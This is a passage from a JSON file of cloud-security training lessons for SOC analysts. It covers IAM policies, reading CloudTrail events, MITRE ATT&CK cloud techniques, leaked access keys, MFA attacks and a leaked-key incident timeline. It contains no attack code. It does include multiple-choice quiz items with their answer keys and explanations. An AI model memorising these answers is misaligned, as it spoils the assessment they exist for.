allowed to do. This is why identity is called the new perimeter, and why the next lesson focuses on cloud authentication and the keys that unlock it."
    },
    {
      "heading": "Who Secures What — and Where the SOC Looks",
      "content": "Cloud security rests on one foundational idea: the **shared responsibility model**. The provider and the customer each own part of security, and confusion about the line is a leading cause of breaches.\n\n- **The provider secures the cloud itself** — the physical data centres, the hardware, the hypervisor that runs virtual machines, and the managed services' underlying infrastructure. This is \"security *of* the cloud.\"\n- **The customer secures what they put in the cloud** — their data, their configurations, their identities and permissions, their network rules, and their application code. This is \"security *in* the cloud.\"\n\nThe practical consequence: when an S3 bucket is left public, an access key is leaked, or a firewall rule is opened to the whole internet, **the provider will not stop it and did nothing wrong** — those are customer-side configuration choices. They are exactly the failures a SOC must catch. No provider control will alert you that your own team misconfigured your own resource; that detection is yours to build.\n\nSo where does a cloud SOC actually look? A handful of data sources carry most of the signal:\n\n- **Management/activity logs** — AWS **CloudTrail** and the **Azure Activity Log** record the API calls that create, change, and delete resources. This is the backbone of cloud detection.\n- **Identity logs** — Entra **sign-in** and **audit** logs (and AWS IAM/console sign-in events) show who authenticated, from where, and whether risk was detected.\n- **Network and flow logs** — VPC flow logs / NSG flow logs show connections in and out.\n- **Storage and data-access logs** — records of who read or wrote to buckets and blobs.\n- **Managed detection services** — **GuardDuty** and **Defender for Cloud** raise ready-made findings you then confirm in the raw logs.\n\nThe analyst's cloud mindset is a shift in attention: away from \"what packet crossed the wire\" and toward \"which identity made which API call, from where, and should they have.\" The remaining cloud lessons drill into the specific pieces — the credentials that authenticate those calls, the audit logs that record them, and the storage and network settings that most often go wrong."
    },
    {
      "heading": "IAM Basics: Principals, Policies, and Roles",
      "content": "Every action explored so far — a console click, a CLI command, an API call — has to pass through one more gate before the cloud provider does anything: **is this principal allowed to do this?** That question is answered by **IAM**, Identity and Access Management, and its three building blocks are worth learning cold, because you will meet them in every single cloud lesson and every real investigation.\n\n### Principal\n\nA **principal** is simply *whoever or whatever is asking* — a human user, a role, a group, or a service. In AWS this is an **IAM user** (a named identity, usually a person or a long-lived service account) or a **role** (an identity nothing owns permanently — it is *assumed*, temporarily, by a person, an application, or another AWS service). In Azure, a principal is a **user**, a **group**, a **service principal** (an application's identity), or a **managed identity** (a service principal Azure manages automatically for a resource, with no secret to leak).\n\n### Policy\n\nA **policy** is a document — in AWS, JSON; in Azure, expressed through role definitions — that spells out exactly which **actions** a principal may take on which **resources**. Nothing is allowed unless a policy explicitly allows it: the default is **deny**. Here is a real, minimal AWS policy that grants read-only access to one specific bucket and nothing else:\n\n```\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"s3:GetObject\", \"s3:ListBucket\"],\n      \"Resource\": [\n        \"arn:aws:s3:::finance-reports\",\n        \"arn:aws:s3:::finance-reports/*\"\n      ]\n    }\n  ]\n}\n```\n\nRead it as a sentence: *allow reading objects and listing the contents of the bucket named finance-reports, and nothing else.* This one, tightly scoped policy is the opposite of the sprawling 'allow everything on everything' policies that make a compromised credential catastrophic instead of contained.\n\n### Role — permissions you borrow, not own\n\nA **role** is an identity with a policy attached, but with no permanent password or key of its own. Instead, a trusted principal **assumes** the role and receives short-lived, temporary credentials (introduced in the next lesson) that expire on their own. Roles are how an EC2 instance, an Azure VM, or a person crossing from one AWS account into another gets exactly the access it needs for exactly as long as it needs it, without a static secret sitting anywhere. Azure's equivalent concept is **Azure RBAC**: built-in **role definitions** (Owner, Contributor, Reader, and many more specific ones) are assigned to a principal at a **scope** — a management group, a subscription, a resource group, or a single resource.\n\n### Why the SOC treats this as foundational\n\nEvery investigation eventually asks: **what could this identity actually do?** An attacker who steals a credential inherits exactly the permissions its policy grants — no more, no less. A tightly scoped policy turns a stolen credential into a minor incident; a policy that grants `\"Action\": \"*\"` on `\"Resource\": \"*\"` turns the same theft into a full account takeover. This is the principle of **least privilege**: grant only the specific actions on the specific resources a principal actually needs. When you triage a cloud incident, one of your very first moves is to pull up the compromised principal's policy and read exactly what door it could open — because that, not the attacker's intent, is what actually bounds the damage."
    },
    {
      "heading": "A Worked Example: Reading Your First Cloud Event",
      "content": "Everything so far has been vocabulary and mechanics. Let's put it to use on one real, simplified log entry — the kind of thing you will see thousands of times a shift once you start working cloud alerts. A deeper anatomy of these events comes in a later lesson; this is your first rehearsal.\n\n### The event\n\n```\n{\n  \"eventTime\": \"2026-08-16T09:14:02Z\",\n  \"eventName\": \"ConsoleLogin\",\n  \"eventSource\": \"signin.amazonaws.com\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"userName\": \"d.rosen\"\n  },\n  \"sourceIPAddress\": \"203.0.113.77\",\n  \"awsRegion\": \"us-east-1\",\n  \"responseElements\": {\n    \"ConsoleLogin\": \"Success\"\n  }\n}\n```\n\n### Reading it field by field\n\n- **eventTime** — *when*: 09:14:02 UTC on 16 August 2026.\n- **eventName** — *what*: `ConsoleLogin`, meaning someone signed into the AWS web console (as opposed to using the CLI or a temporary role).\n- **eventSource** — *which service* logged it: the sign-in service itself.\n- **userIdentity.userName** — *who*: the IAM user `d.rosen`.\n- **sourceIPAddress** — *from where*: `203.0.113.77`.\n- **awsRegion** — where the action was recorded, though console sign-in is a global action.\n- **responseElements.ConsoleLogin** — *the outcome*: `Success`.\n\n### Turning it into a sentence\n\nEvery cloud event, no matter the vendor, answers the same five questions, and reading it well means assembling them into one plain sentence: *\"At 09:14 UTC, the user d.rosen successfully logged into the AWS console from IP address 203.0.113.77.\"* That is the whole skill. Once you can do that automatically, the next question an analyst always asks follows naturally: **does this make sense?** Is `203.0.113.77` an IP this user normally logs in from? Is 09:14 within their normal working hours? Is a *console* login even normal for this identity, or does d.rosen only ever use automation? A single event rarely proves an incident by itself — but a fluently read event is what lets you notice the one that doesn't fit."
    },
    {
      "heading": "What Attackers Actually Target in the Cloud",
      "content": "Knowing the vocabulary and the logs is only useful once you know what you're looking *for*. Fortunately, cloud attacks follow well-documented, repeatable patterns, catalogued by **MITRE ATT&CK** — a public knowledge base that names and numbers real-world attacker tactics and techniques (for example, `T1078` for 'Valid Accounts'), including a dedicated **Cloud Matrix**. You do not need to memorise the whole matrix, but recognising its shape tells you what to hunt for.\n\n### The typical cloud attack arc\n\n| Tactic (the goal) | Example technique | What it looks like in practice |\n|---|---|---|\n| Initial Access | Valid Accounts (`T1078.004`) | Attacker signs in or calls the API using a stolen password or leaked access key — no exploit needed |\n| Discovery | Cloud Infrastructure Discovery (`T1580`) | A burst of `List*`/`Describe*`/`Get*` calls mapping users, buckets, roles, and permissions right after access |\n| Persistence | Create Account (`T1136.003`) | Attacker creates a new IAM user, access key, or role so they can get back in even if the original credential is revoked |\n| Privilege Escalation | Abuse Elevation Control Mechanism | Attaching an administrator policy to a low-privilege identity, or exploiting a policy that lets a user modify their own permissions |\n| Defense Evasion | Impair Defenses: Disable Cloud Logs (`T1562.008`) | Turning off CloudTrail or Azure diagnostic logging so later actions are not recorded (a later lesson covers this in depth) |\n| Exfiltration | Transfer Data to Cloud Account (`T1537`) | Copying data, snapshots, or database backups to a storage account or bucket the attacker controls |\n| Impact | Resource Hijacking (`T1496`) | Launching large numbers of compute instances, usually for cryptocurrency mining, running up the victim's bill |\n\n### The pattern underneath the pattern\n\nNotice something about every row in that table: **every single one of them happens on the customer side of shared responsibility.** No AWS or Azure vulnerability is required — the attacker rides in on a stolen credential (initial access), uses ordinary, permitted API calls to look around (discovery), and abuses whatever permissions that credential happens to have (escalation, persistence, exfiltration). This is exactly why the earlier sections on IAM and least privilege matter so much: **every stage of this arc is smaller and slower to execute — and easier to catch — against tightly scoped policies and well-monitored logs than against sprawling permissions and unwatched activity.**\n\nHold onto this table loosely as a mental checklist. When you review any cloud alert, ask which stage of this arc it represents, because the answer tells you how urgent it is (initial access and persistence deserve the fastest response) and what to look for next (discovery is often followed by escalation within minutes)."
    }
  ],
  "keyTakeaways": [
    "The cloud is rented, software-defined, internet-reachable computing where misconfiguration (not broken hardware) causes most breaches, so analysts increasingly watch identities and API calls rather than packets and hosts.",
    "AWS and Azure do the same things with different names (account/subscription, IAM/Entra, EC2/VM, S3/Blob, Security Groups/NSG, CloudTrail/Azure Activity Log); learning the map lets you read either dialect.",
    "Console, CLI, and direct API all collapse into the same loggable API calls, which is why the provider can record every action — who, what, where, and success or failure.",
    "Under shared responsibility the provider secures the cloud while the customer secures their data, config, identities, and network rules; public buckets, leaked keys, and open firewall rules are customer-side failures the SOC must catch in CloudTrail, Azure Activity, and identity logs.",
    "A principal (user, role, or service) is granted permissions through a policy — a JSON document naming allowed actions and resources — and a role lets an identity borrow temporary permissions instead of owning them permanently; least privilege keeps any single compromised identity's blast radius small.",
    "Attackers follow a predictable cloud playbook mapped by MITRE ATT&CK's Cloud Matrix — valid-account abuse, cloud infrastructure discovery, new-account persistence, and data transfer to attacker-controlled storage — and nearly every step happens on the customer side of shared responsibility, which is exactly where the SOC's detections must live."
  ],
  "quiz": [
    {
      "question": "A new analyst assumes that because a company's servers run in AWS, Amazon is responsible for making sure none of the company's storage buckets are accidentally left open to the public internet. Why is this assumption wrong?",
      "options": [
        {
          "label": "Amazon does secure bucket permissions for customers, so the analyst is actually correct and no internal monitoring for public buckets is ever needed.",
          "value": "a"
        },
        {
          "label": "Under shared responsibility the provider secures the infrastructure, but the customer owns their data and configuration, so a public bucket is the customer's failure to catch.",
          "value": "b"
        },
        {
          "label": "Bucket permissions are set by the hardware layer that Amazon controls, so any public exposure is automatically a physical data-centre problem.",
          "value": "c"
        },
        {
          "label": "Storage permissions are handled entirely by the network firewall, which the provider configures, so customers never influence whether a bucket is public.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The shared responsibility model splits duties: the provider secures the cloud infrastructure (hardware, hypervisor, managed-service backbone), while the customer secures their data, configuration, identities, and access rules. A public storage bucket is a customer-side configuration choice, so it is the SOC's job to detect it. Option a is dangerously false. Options c and d misattribute a configuration setting to hardware or provider-run firewalls, which is not how storage permissions work."
    },
    {
      "question": "Why can a cloud provider record essentially every management action a user takes — whether that user clicked in the web console, typed an aws CLI command, or called the API from a script?",
      "options": [
        {
          "label": "Because the console, CLI, and scripts all ultimately perform the same underlying API calls, which the provider logs as who did what, where, and with what result.",
          "value": "a"
        },
        {
          "label": "Because the provider installs a monitoring agent on every analyst's personal laptop that records their screen and keystrokes during any cloud session.",
          "value": "b"
        },
        {
          "label": "Because only the web console produces logs, so organisations simply forbid the CLI and API to guarantee that all activity is fully captured.",
          "value": "c"
        },
        {
          "label": "Because cloud actions are recorded solely at the network packet level, so the provider reconstructs each action by reassembling raw traffic after the fact.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "The console and CLI are friendly wrappers around the provider's API, so every action collapses into an API call that services like CloudTrail and Azure Activity Log record, capturing the identity, action, resource, source IP, and outcome. Option b invents laptop surveillance that does not exist. Option c is false because the CLI and API are logged too, not forbidden. Option d is wrong because cloud auditing is built on API-call records, not packet reassembly."
    },
    {
      "question": "An EC2 instance's role has a policy granting s3:* on Resource: \"*\" — full access to every S3 action on every bucket in the account — even though the application only ever needs to read files from one specific bucket. What does this illustrate, and what should replace it?",
      "options": [
        {
          "label": "There is no concern, because roles automatically expire every hour regardless of the permissions written in the policy attached to them.",
          "value": "a"
        },
        {
          "label": "This violates least privilege; the policy should be scoped to the specific actions it needs, like s3:GetObject, on the one bucket the application actually uses.",
          "value": "b"
        },
        {
          "label": "The concern is that policies must always be written in XML, so this JSON policy will fail to attach and the instance will simply have no access.",
          "value": "c"
        },
        {
          "label": "There is no concern, because attaching a policy to a role only affects console clicks and never governs API calls made by the running application.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "This is a textbook least-privilege violation: the policy should name the specific actions (like s3:GetObject) and the specific bucket the application needs, not a wildcard on everything. A leaked or abused credential from this role would otherwise have full S3 access account-wide. Option a is wrong; expiration timing does not fix an overly broad policy. Option c invents a JSON/XML restriction that does not exist in AWS. Option d is false; the policy governs every API call the role makes, console or otherwise."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/whitepapers/latest/aws-overview/introduction.html",
    "https://learn.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility",
    "https://learn.microsoft.com/en-us/azure/cloud-adoption-framework/ready/considerations/fundamental-concepts",
    "https://attack.mitre.org/matrices/enterprise/cloud/",
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html"
  ],
  "xp": 230,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-authentication-access-keys",
  "slug": "cloud-authentication-and-access-keys",
  "title": "Cloud Authentication & Access Keys",
  "topic": "Cloud Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "In the cloud, a credential is the keys to the kingdom. There is no building to walk into and no cable to unplug — if you hold a valid credential with the right permissions, you can create, read, or destroy resources from anywhere on earth. That makes cloud authentication, and especially the long-lived access keys that so often leak, one of the most important topics a SOC analyst can master. This lesson explains how cloud identities prove who they are, how enterprises actually log in through federation and single sign-on, why leaked access keys cause so many breaches, how IAM policies determine exactly what a stolen credential can do, the role MFA plays, how an analyst detects credential abuse, and finally walks a full leaked-key incident end to end so every piece connects into one story.",
  "sections": [
    {
      "heading": "How Cloud Identities Prove Who They Are",
      "content": "Cloud authentication answers the question \"who is making this request?\" before any permission is even checked. There are two broad kinds of identity, and telling them apart is the foundation for everything else.\n\n**Human identities** are people: an engineer signing into the AWS console, an admin logging into the Azure portal. They typically authenticate with a **username and password**, ideally backed by **multi-factor authentication (MFA)**, and increasingly through **single sign-on (SSO)** so one corporate login grants access to the cloud.\n\n**Machine (workload) identities** are programs: an application, a virtual machine, or a script that needs to call the cloud without a human present. These cannot type a password, so they authenticate with a **key** or a **token** — a secret string the provider issues and recognises.\n\nThe crucial split, which recurs throughout this lesson, is **long-lived versus temporary** credentials.\n\n- **Long-lived credentials** are static secrets that keep working until someone manually revokes them. The classic example is an **AWS access key**, a pair made of an **access key ID** (a public-ish identifier beginning with `AKIA`) and a **secret access key** (the actual secret). In Azure, the analogue is a **service principal** with a **client secret** or certificate. These are convenient but dangerous: if stolen, they work for the thief exactly as they worked for the owner, indefinitely.\n- **Temporary credentials** are short-lived. In AWS the **Security Token Service (STS)** issues time-limited keys (their IDs begin with `ASIA`) that expire in minutes to hours. Azure and the others issue similar short-lived **tokens**. Because they expire, a stolen temporary credential has a small window of usefulness.\n\nA related best-practice pattern ties these together: instead of handing a workload a permanent key, you attach a **role** (an identity a resource can assume) and let the platform hand it fresh temporary credentials automatically. An EC2 instance or Azure VM with a **managed identity** gets rotating credentials it never stores on disk. The security lesson is simple and consistent: prefer temporary, prefer platform-managed, and treat every long-lived key as a liability to minimise."
    },
    {
      "heading": "Federation and Single Sign-On: How Enterprises Actually Log In",
      "content": "The picture so far — a human typing a cloud-specific username and password — is actually rare in a real company. Managing a separate password per employee per cloud account does not scale and is a security liability on its own (more passwords to leak, more places to enforce MFA). Instead, mature organisations use **federation**.\n\n### What federation means\n\n**Federation** means identity lives in exactly **one** central place — the company's **identity provider (IdP)** — and every other system, including AWS and Azure, **trusts** that IdP instead of keeping its own password for the user. When an employee logs into their laptop or a company SSO portal, that single login can then grant access to email, internal apps, and the cloud console, without typing a separate cloud password. This is **single sign-on (SSO)**: one authentication event, many systems unlocked.\n\nTwo standard protocols carry this trust under the hood: **SAML** (an older but still very common XML-based standard) and **OIDC/OAuth 2.0** (a modern, JSON/token-based standard built on top of OAuth). You do not need to implement either, but recognising the names in logs and architecture diagrams matters: they are *how* the IdP proves a user's identity to AWS or Azure without ever sharing a password with them.\n\n### How it looks in each cloud\n\n- **AWS IAM Identity Center** (formerly AWS SSO) is AWS's federation hub: it connects to a company's IdP, and when a user signs in, AWS grants them **temporary credentials** for a **role** in one or more AWS accounts via an API call named `AssumeRoleWithSAML` (or the OIDC equivalent). The user never has an IAM password at all — they only ever hold short-lived, role-based access.\n- **Microsoft Azure** takes this further: **Microsoft Entra ID** *is itself* the identity provider for the whole Microsoft ecosystem, and most other applications federate *into* it, rather than Azure federating out.\n\n### Cross-account access — the same idea, one level deeper\n\nThe same trust mechanism lets one AWS account's role be assumed by a principal in a *different* AWS account — this is how large organisations let engineers move between a shared 'identity' account and dozens of workload accounts without separate credentials in each. A role's **trust policy** names exactly which external principals are allowed to assume it; its **permissions policy** (covered later in this lesson) names what they can do once they have.\n\n### Why the SOC cares\n\nFederation concentrates enormous power in one place: **the corporate identity provider becomes the front door to everything**, cloud included. A compromised IdP account — or a compromised SSO session — can cascade into every cloud account and application that trusts it, often *without ever triggering a cloud-native alert*, because from AWS's or Azure's point of view, a legitimately federated sign-in looks exactly like the real user. This is why a mature SOC watches the **identity provider's own sign-in and MFA logs** just as closely as CloudTrail or Azure Activity — the compromise, and often the best early warning, happens one hop upstream of the cloud itself."
    },
    {
      "heading": "Access Keys — The Credential That Leaks",
      "content": "If one credential type dominates cloud breach stories, it is the **long-lived access key**. Understanding why requires seeing both its convenience and its danger.\n\nAn access key is a static secret that a developer can paste into a script, a configuration file, or an environment variable so their code can call the cloud. That convenience is exactly the problem: static secrets end up in places they should never be.\n\n**Where access keys leak:**\n\n- **Source code committed to Git**, especially public **GitHub** repositories, where automated bots scan for `AKIA` strings within seconds of a push.\n- **CI/CD logs and build output** that accidentally print the secret.\n- **Laptops, shared drives, and chat messages** where a key was pasted \"just for now.\"\n- **Container images and configuration files** baked with credentials inside.\n\nOnce a key leaks, the attack is trivial: the thief configures their own tools with the stolen key and immediately has whatever permissions the key's owner had. There is no password to guess and no MFA prompt in the way, because the key *is* the proof of identity. This is why the very first minutes after a public leak matter — attackers and their bots often begin using a leaked key within minutes.\n\nWhat attackers do with a stolen key follows a familiar arc: they **enumerate** what the key can do, look for a path to **escalate privileges**, then pursue their goal — reading data, launching resources (often crypto-mining), or establishing persistence by creating new users and keys of their own.\n\n**Defending access keys** comes down to a short, strict playbook:\n\n- **Prefer roles and temporary credentials** over long-lived keys wherever possible, and use managed identities for workloads.\n- **Rotate** any keys that must exist, and delete unused ones.\n- **Scope them tightly** with least privilege, so a leaked key is far less damaging.\n- **Never commit keys to source control**; scan repositories and CI logs for secrets.\n- **Monitor key usage** so first use from a new location stands out.\n\nThe mental model to carry: an access key is a password that never changes, works from anywhere, and is often written down. Treat it accordingly."
    },
    {
      "heading": "IAM Policies and Least Privilege: What a Credential Can Actually Do",
      "content": "A stolen credential — whether it is a password, an access key, or a federated session — is only as dangerous as the **policy** attached to the identity behind it. Understanding how policies are evaluated is what lets an analyst answer the single most important triage question: *given this compromised identity, what is the worst that could have happened?*\n\n### The evaluation logic, in plain terms\n\nCloud permission systems share a consistent logic:\n\n1. **Default deny.** With no policy at all, a principal can do nothing.\n2. **An explicit allow is required.** A policy statement with `\"Effect\": \"Allow\"` on a specific action and resource is what opens a door.\n3. **An explicit deny always wins.** If any applicable policy says `\"Effect\": \"Deny\"`, no allow anywhere can override it. This is what makes deny-based guardrails (like a Service Control Policy in AWS Organizations) so powerful — they cap what even an administrator's own permissions can do.\n\n### A least-privilege policy versus a dangerous one\n\nCompare two real policy shapes:\n\n```\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"s3:GetObject\",\n  \"Resource\": \"arn:aws:s3:::backup-archive-2026/*\",\n  \"Condition\": {\n    \"Bool\": {\"aws:MultiFactorAuthPresent\": \"true\"}\n  }\n}\n```\n\nversus\n\n```\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"*\",\n  \"Resource\": \"*\"\n}\n```\n\nThe first grants exactly one action, on exactly one bucket, and even adds a **condition** requiring MFA to have been used in the current session. If this identity's credential leaks, the damage is bounded to reading files from one archive bucket. The second — often seen attached out of convenience during a rushed project — grants *every action on every resource in the account*. A leak of that credential is not an incident, it is a full account takeover. The difference between these two policies, not the attacker's skill, is usually what separates a contained incident from a catastrophic one.\n\n### Scoping tools worth knowing\n\n- **Actions and resources**: name the specific API calls (`s3:GetObject`, not `s3:*`) and the specific ARNs (Amazon Resource Names), not wildcards.\n- **Conditions**: restrict *when* a policy applies — by source IP range (`aws:SourceIp`), by whether MFA was used, or by time.\n- **Azure RBAC** achieves the same goal differently: instead of hand-written JSON per user, you assign a **role definition** (built-in ones like Reader, Contributor, or a narrowly scoped custom role) at the smallest sensible **scope** — a single resource group rather than the whole subscription.\n\n### Why this belongs in every investigation\n\nWhen you confirm a credential is compromised, do not stop at revoking it. **Pull up its attached policies and read exactly what it could do** — which buckets, which regions, which destructive actions (`DeleteBucket`, `TerminateInstances`, `CreateUser`) were within reach. That reading is what turns 'a key leaked' into an accurate, defensible scope statement for the incident report, and it is exactly the skill the case study at the end of this lesson puts to work."
    },
    {
      "heading": "MFA — Adding a Second Proof",
      "content": "**Multi-factor authentication (MFA)** requires a second proof of identity beyond the password, and in the cloud it is one of the highest-value controls a SOC can champion. The idea is to combine factors from different categories: **something you know** (a password), **something you have** (a phone app or hardware key), and **something you are** (a fingerprint or face). Requiring two means a stolen password alone is no longer enough.\n\nIn practice, cloud MFA usually means that after entering a password, the user must approve a prompt in an **authenticator app**, enter a rotating **one-time code**, or tap a **hardware security key**. For the most powerful identities — the AWS **root** account and Azure **Global Administrator** — MFA is not optional in any mature environment; those accounts can undo every other control, so they must be protected the most.\n\nBut MFA has an important boundary that analysts must understand: **it protects interactive sign-ins, not static keys or tokens.** An AWS access key or an Azure client secret authenticates without any MFA prompt, because it is a machine credential. So MFA on a human's console login does nothing to protect a leaked programmatic key. This is precisely why leaked access keys are so dangerous and why reducing long-lived keys matters even in an MFA-everywhere environment.\n\nAttackers have also learned to attack MFA itself, and these techniques show up in identity logs:\n\n- **MFA fatigue (prompt bombing):** flooding a user with approval prompts until they tap \"approve\" out of annoyance. In logs this looks like many MFA challenges in quick succession, mostly denied, then one approval.\n- **Adversary-in-the-middle (AiTM) phishing:** proxying the real login page to steal the post-MFA session token, then replaying it — bypassing the prompt entirely.\n- **SIM swapping** to intercept SMS codes, which is why app-based or hardware MFA is preferred over SMS.\n\nThe takeaways for a SOC: push for MFA on all human identities and especially privileged ones; recognise that MFA does not cover programmatic credentials; and watch for the signatures of MFA abuse — bursts of prompts, sudden new MFA method registrations (a common attacker persistence step), and token reuse from unexpected locations."
    },
    {
      "heading": "Detecting Credential Abuse",
      "content": "Because credentials are the cloud's real perimeter, detecting their misuse is central SOC work. The good news is that authentication and API activity are richly logged; the skill is knowing the patterns that betray a stolen credential.\n\n### Build a baseline first\n\nFor each identity — human or machine — normal behaviour has a shape: the source IPs and countries it uses, the times it is active, the API actions it calls, and the regions it touches. Detection is largely about deviation from that shape.\n\n**High-value signals to hunt:**\n\n- **First use of a key from a new location.** An access key that has only ever been called from your CI system in one region suddenly making calls from a foreign residential or hosting IP is a classic leaked-key indicator. Correlate the source IP and User-Agent against the key's history.\n- **Impossible travel and unfamiliar sign-in properties** on human accounts — authentication from two distant places too close in time, or a new device/country combination — point to account takeover.\n- **Enumeration bursts.** A credential suddenly calling many descriptive/list actions (listing users, buckets, permissions) in a short window is often an attacker mapping what they can do right after gaining access.\n- **Sensitive identity actions.** Creating new users or access keys (`CreateUser`, `CreateAccessKey`), attaching powerful policies, or registering a new MFA method — especially from an unusual source — signals an attacker establishing durable access.\n- **MFA anomalies.** A rapid series of denied MFA prompts followed by an approval (MFA fatigue), or a sign-in that should have required MFA succeeding with only a single factor.\n- **Use of anonymising infrastructure** — Tor exit nodes or anonymising VPNs — for cloud authentication.\n\n### Confirm by correlation, not by a single alert\n\nA key used from a new IP might be an engineer travelling; the same key then enumerating IAM and creating a new user is almost certainly compromise. Managed services help surface leads: AWS **GuardDuty** raises findings like credential exfiltration and anomalous behaviour, and **Entra ID Protection** scores risky sign-ins and risky users. Treat these as starting points, then verify in the raw CloudTrail, Azure Activity, and sign-in logs.\n\n### Respond in proportion\n\nFor a confirmed compromised credential: **revoke or deactivate the key** (or force a password reset and revoke sessions/tokens for a human), rotate related secrets, review what the credential accessed, and hunt for persistence such as newly created users, keys, or MFA methods. The discipline mirrors the rest of SOC work: baseline, alert on deviation, confirm by correlation, then contain decisively."
    },
    {
      "heading": "Case Study: Anatomy of a Leaked Key Incident",
      "content": "Let's walk one incident end-to-end, tying together identity types, leaked keys, policies, MFA's blind spot, and detection into a single timeline — the way you would reconstruct it during an actual investigation.\n\n### The timeline\n\n| Time (UTC) | Event | What it means |\n|---|---|---|\n| 09:02 | A developer pushes code to a public GitHub repository that accidentally includes an AWS access key (AKIA...) belonging to an IAM user with an attached administrator policy | The long-lived credential is now exposed to the entire internet |\n| 09:05 | An automated secret-scanning bot finds the key in the public commit | Attackers routinely run bots that scan public commits within minutes |\n| 09:07 | ListUsers and ListAccessKeys calls appear from a foreign IP never associated with this key before | Discovery/enumeration — the attacker is mapping what the stolen key can do |\n| 09:09 | CreateAccessKey is called for the compromised IAM user, generating a second, attacker-controlled key | Persistence — even if the original leaked key is revoked, this backup key still works |\n| 09:12 | RunInstances launches a large number of GPU compute instances in ap-southeast-3, a region this account has never used | Impact — resource hijacking, almost always for cryptocurrency mining |\n\n### Reading the timeline the way an analyst would\n\nNotice that not one step in this chain required breaking anything technical — every action was a normal, permitted API call, made possible only because the underlying policy was `\"Action\": \"*\"`, `\"Resource\": \"*\"`. And notice that **no MFA prompt appears anywhere** in this timeline, because access keys authenticate without one — exactly the blind spot the earlier MFA section warned about.\n\n### Where each earlier lesson concept would have caught this\n\n- **Least privilege:** if the original policy had been scoped to only the actions the developer's script actually needed, steps from 09:07 onward would have failed outright with `AccessDenied`.\n- **Preferring temporary credentials:** a role with STS-issued temporary credentials instead of a static key could not have been usefully committed to GitHub in the first place — it would have expired long before discovery.\n- **Detecting credential abuse:** the first use from a new location at 09:07 is exactly the 'first use from a new IP' signal to alert on; the `CreateAccessKey` at 09:09 is exactly the 'sensitive identity action' signal.\n- **Secret scanning on the developer side:** pre-commit hooks or repository scanning could have caught the key before the push ever completed, closing the door before 09:02 even finished.\n\n### The response\n\nOnce discovered, the response is immediate and layered: **deactivate both access keys** (the original and the attacker-created one), **terminate the rogue instances**, **review every action the user identity took** for further persistence (new users, new roles, modified trust policies), and **rotate any other secrets the developer's machine could reach**. The postmortem then feeds back into prevention — tightening the policy, mandating temporary credentials for this workload, and adding repository secret-scanning — so the same static key can never again be the single point of failure it was here."
    }
  ],
  "keyTakeaways": [
    "Cloud identities are human (password + MFA + SSO) or machine (keys/tokens); the critical split is long-lived credentials like AWS access keys (AKIA) and Azure client secrets versus temporary, auto-expiring credentials from STS/managed identities.",
    "Enterprises rarely hand out cloud-specific passwords; federation lets one identity provider (via SAML or OIDC) grant access across systems through single sign-on, and cross-account role assumption uses the same trust-policy mechanism — which means the identity provider itself is the real front door the SOC must watch.",
    "Long-lived access keys are the credential that leaks — into Git, CI logs, laptops, and images — and because the key itself is the proof of identity, a thief needs no password and faces no MFA, so prefer roles/temporary credentials, rotate, scope tightly, and never commit keys.",
    "Permission evaluation is default-deny with an explicit allow required and an explicit deny always winning; a leaked credential's actual damage is bounded by its attached policy, so least-privilege scoping (specific actions, specific resources, conditions like MFA) is what separates a contained incident from a full takeover — as the leaked-key case study shows step by step.",
    "MFA is a high-value control for human sign-ins (mandatory for root/Global Admin) but does NOT protect programmatic keys or tokens; watch for MFA fatigue, AiTM token theft, and new MFA-method registration as attacker signatures.",
    "Detect credential abuse by baselining each identity and alerting on deviation: first key use from a new location, impossible travel, enumeration bursts, sensitive IAM actions, and anonymised sources — then confirm by correlation and revoke on confirmation."
  ],
  "quiz": [
    {
      "question": "A developer accidentally commits an AWS access key (an AKIA key ID plus its secret) to a public GitHub repository. Within minutes, the key is used from an unfamiliar foreign IP to list IAM users and create a new access key. Why did MFA on the developer's console login fail to prevent this?",
      "options": [
        {
          "label": "MFA failed only because the developer had disabled it that morning; with MFA enabled, the leaked access key would have required a second factor to work.",
          "value": "a"
        },
        {
          "label": "MFA protects interactive human sign-ins, but a programmatic access key authenticates on its own with no MFA prompt, so the key itself was enough for the attacker.",
          "value": "b"
        },
        {
          "label": "MFA would have blocked the attack, but GitHub stripped the MFA requirement from the key when the repository was made public to the internet.",
          "value": "c"
        },
        {
          "label": "MFA did prevent the attack; the observed activity must be the developer themselves, because a leaked key can never be used without the account password.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "MFA secures interactive sign-ins, but an access key is a machine credential that authenticates without any MFA prompt — the key is itself the proof of identity — so a leaked key works for a thief exactly as it did for the owner. Option a is wrong because MFA on the console does not gate programmatic key use regardless of whether it was enabled. Option c invents GitHub behaviour that does not exist. Option d wrongly assumes a key needs the password, which it does not."
    },
    {
      "question": "Your organisation wants to reduce the risk that a compromised credential gives an attacker durable, wide-ranging cloud access. Which approach most directly addresses the core weakness of long-lived access keys?",
      "options": [
        {
          "label": "Print all access keys to a secured document each month so administrators can review which ones exist and confirm they are still needed.",
          "value": "a"
        },
        {
          "label": "Give every workload broad wildcard permissions so fewer distinct keys are required and the overall configuration stays simpler to manage.",
          "value": "b"
        },
        {
          "label": "Replace long-lived keys with roles and temporary, auto-expiring credentials (managed identities) wherever possible, and tightly scope any keys that remain.",
          "value": "c"
        },
        {
          "label": "Disable MFA on human accounts so that authentication is consistent between people and machine identities across the whole environment.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "The core weakness of a long-lived key is that it works indefinitely from anywhere once stolen; replacing it with roles and temporary, auto-expiring credentials shrinks the window of usefulness, and least-privilege scoping limits the damage of any key that must remain. Option a does nothing to reduce the keys' danger. Option b increases risk by widening permissions. Option d weakens security by removing MFA, making human credential theft easier."
    },
    {
